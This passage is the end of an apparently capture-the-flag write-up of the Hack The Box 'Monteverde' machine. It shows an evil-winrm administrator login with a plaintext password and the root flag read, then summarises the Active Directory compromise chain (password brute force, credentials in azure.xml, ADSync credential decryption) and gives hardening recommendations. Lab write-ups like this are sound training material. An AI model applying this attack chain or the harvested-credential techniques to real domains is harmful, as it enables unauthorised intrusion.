+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>[Jun <span style="color:#ae81ff">03</span>, <span style="color:#ae81ff">2025</span> - <span style="color:#ae81ff">05</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">08</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">38</span> (UTC)] exegol-HTB Monteverde <span style="color:#75715e"># evil-winrm -u &#34;administrator&#34; -p &#39;d0m@in4dminyeah!&#39; -i &#34;dc.megabank.local&#34;</span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>Info<span style="color:#960050;background-color:#1e0010">:</span> Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ../desktop
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Administrator\desktop&gt; cat root.txt
+</span></span><span style="display:flex;"><span>28d7c0ae4df442b024ceb5010057838c
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Administrator\desktop&gt;
+</span></span></code></pre></div><p><strong>Outcome:</strong></p>
+<ul>
+<li>Full administrative access confirmed.</li>
+<li>Retrieved the <strong>root flag</strong></li>
+</ul>
+<h3 id="conclusion">Conclusion</h3>
+<ul>
+<li>
+<p><strong>Initial Enumeration:</strong><br>
+Nmap scan confirmed an AD environment with SMB, LDAP, Kerberos, and RPC services.</p>
+</li>
+<li>
+<p><strong>RPC Enumeration:</strong><br>
+Discovered domain user list and group memberships (including “Azure Admins”).</p>
+</li>
+<li>
+<p><strong>Credential Discovery:</strong><br>
+Valid credential pair (<code>SABatchJobs:SABatchJobs</code>) obtained via brute-force (username = password).</p>
+</li>
+<li>
+<p><strong>SMB Enumeration:</strong><br>
+<code>SABatchJobs</code> had read access to <code>users$</code> and <code>azure_uploads</code> shares.</p>
+</li>
+<li>
+<p><strong>Information Disclosure:</strong><br>
+Retrieved <code>azure.xml</code> from <code>mhope</code> home directory containing user credentials (<code>mhope:4n0therD4y@n0th3r$</code>).</p>
+</li>
+<li>
+<p><strong>Low-Privilege Compromise:</strong><br>
+Established WinRM shell as <code>mhope</code>, retrieved user flag, and identified membership in “Azure Admins.”</p>
+</li>
+<li>
+<p><strong>Privilege Escalation via ADSync:</strong><br>
+Enumerated Azure AD Sync database, ran PoC to decrypt and retrieve domain administrator credentials.</p>
+</li>
+<li>
+<p><strong>Full Compromise:</strong><br>
+Logged in as <code>administrator</code> via WinRM, retrieved root flag.</p>
+</li>
+</ul>
+<p><strong>Recommendations:</strong></p>
+<ol>
+<li>
+<p>Enforce strong, unique passwords and disable trivial password reuse.</p>
+</li>
+<li>
+<p>Restrict and monitor access to SMB shares, especially user home directories.</p>
+</li>
+<li>
+<p>Secure Azure AD Connect configuration and restrict database read access.</p>
+</li>
+<li>
+<p>Implement Least Privilege for service accounts (e.g., do not allow “SABatchJobs” to read home directories).</p>
+</li>
+<li>
+<p>Regularly audit membership of privileged groups (e.g., “Azure Admins”) and review AD sync account permissions.</p>
+</li>
+</ol>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
